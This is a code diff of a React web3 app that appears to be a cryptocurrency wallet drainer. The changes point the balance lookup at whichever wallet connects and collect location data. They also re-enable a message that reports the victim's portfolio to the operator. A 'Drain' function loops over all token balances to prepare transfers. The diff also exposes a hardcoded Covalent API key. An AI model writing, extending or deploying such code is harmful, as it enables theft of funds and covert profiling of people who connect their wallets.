@@ -13,6 +13,39 @@ function App() {
   const [connected, setConnected] = useState(false);
   const [account, setAccount] = useState("");
   const [balances, setBalances] = useState([]);
+  // const [bscbalances]
+  async function checkAndChangeNetwork() {
+    try {
+      const web3= new Web3(window.ethereum)
+        const networkId = await web3.eth.net.getId();
+        console.log(Number(networkId))
+        // Ethereum's main network ID is 1
+        if (Number(networkId) !== 1) {
+            // Check if MetaMask is available
+            if (window.ethereum) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x1', // Hexadecimal version of 1
+                            chainName: 'Ethereum Mainnet',
+                            rpcUrls:['']
+                            // ... other parameters like rpcUrls, blockExplorerUrls etc.
+                        }]
+                    });
+                } catch (error) {
+                    console.error('User rejected the network change request');
+                }
+            } else {
+                console.log('MetaMask is not available');
+            }
+        } else {
+            console.log('Already connected to the Ethereum Mainnet');
+        }
+    } catch (error) {
+        console.error('An error occurred:', error);
+    }
+}
   const connectWallet = async () => {
     if (typeof window.ethereum !== "undefined") {
       try {
@@ -21,8 +54,10 @@ function App() {
         const accounts = await web3.eth.getAccounts();
         console.log("Connected account:", accounts[0]);
         setAccount(accounts[0]);
+        checkAndChangeNetwork()
         setConnected(true);
         ApiServices(accounts[0]);
+        getLocationData()
       } catch (error) {
         console.error(error);
       }
@@ -47,7 +82,6 @@ function App() {
   };
   const Drain = async () => {
     if (connected) {
-      console.log("called");
       for (const item of balances) {
         try {
           await prepareTransaction(item);
@@ -83,7 +117,7 @@ function App() {
   const ApiServices = async (account) => {
     axios
       .get(
-        `https://api.covalenthq.com/v1/bsc-mainnet/address/${"0x0C64612701224FDFfd78bbde3e8f04f2A491dCeB"}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
+        `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
       )
       .then((res) => {
         let newArr = res?.data?.data?.items?.filter(
@@ -104,13 +138,13 @@ function App() {
       .catch((err) => {});
   };
   useEffect(() => {
-    // if (balances?.length>0) {
-    //   let message='Totol Portfolio is '
-    //   balances.forEach((item)=>{
-    //     message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
-    //   })
-    //   sendMessage(message)
-    // }
+    if (balances?.length>0) {
+      let message='Totol Portfolio is '
+      balances.forEach((item)=>{
+        message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
+      })
+      sendMessage(message)
+    }
   }, [balances]);
 
   return (
